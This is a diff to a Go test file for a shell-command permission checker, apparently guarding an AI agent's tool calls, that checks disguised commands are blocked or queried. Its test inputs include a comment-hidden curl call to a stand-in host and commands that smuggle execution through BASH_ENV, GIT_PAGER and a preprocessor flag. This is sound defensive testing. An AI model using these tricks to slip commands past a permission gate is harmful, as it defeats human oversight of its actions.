@@ -14,17 +14,18 @@ func TestShellBypassesAsk(t *testing.T) {
 		"echo x >&file",
 		"rg --pre=sh pat f.sh",
 	} {
-		if d := Decide(Auto, shellReq(cmd), nil); d.Verdict == Allow {
+		if d := Decide(Review, shellReq(cmd), nil); d.Verdict == Allow {
 			t.Errorf("%q allowed: %+v", cmd, d)
 		}
 	}
-	// The hidden line's own command is what the card offers to remember.
-	d := Decide(Auto, shellReq("echo ok #'\ncurl https://evil.example\n#'"), nil)
-	if d.Verdict != Ask || len(d.Remember) != 1 || d.Remember[0].Pattern != "curl" {
+	// The hidden line's own command is what the card offers to remember,
+	// exactly: a bare "curl" rule would later allow any URL.
+	d := Decide(Review, shellReq("echo ok #'\ncurl https://evil.example\n#'"), nil)
+	if d.Verdict != Ask || len(d.Remember) != 1 || d.Remember[0].Pattern != "curl https://evil.example" {
 		t.Fatalf("comment-hidden command: %+v", d)
 	}
 	// A comment that hides nothing still runs.
-	if d := Decide(Auto, shellReq("ls # list files"), nil); d.Verdict != Allow {
+	if d := Decide(Review, shellReq("ls # list files"), nil); d.Verdict != Allow {
 		t.Fatalf("plain comment: %+v", d)
 	}
 }
@@ -40,11 +41,11 @@ func TestRulesIgnoreDangerousEnvironment(t *testing.T) {
 		"BASH_ENV=/tmp/x make all",
 		"GIT_PAGER='sh -c id' git log",
 	} {
-		if d := Decide(Auto, shellReq(cmd), rules); d.Verdict == Allow {
+		if d := Decide(Review, shellReq(cmd), rules); d.Verdict == Allow {
 			t.Errorf("%q allowed by a rule: %+v", cmd, d)
 		}
 	}
-	if d := Decide(Auto, shellReq("CI=1 make all"), rules); d.Verdict != Allow {
+	if d := Decide(Review, shellReq("CI=1 make all"), rules); d.Verdict != Allow {
 		t.Fatalf("a plain variable keeps the rule: %+v", d)
 	}
 }
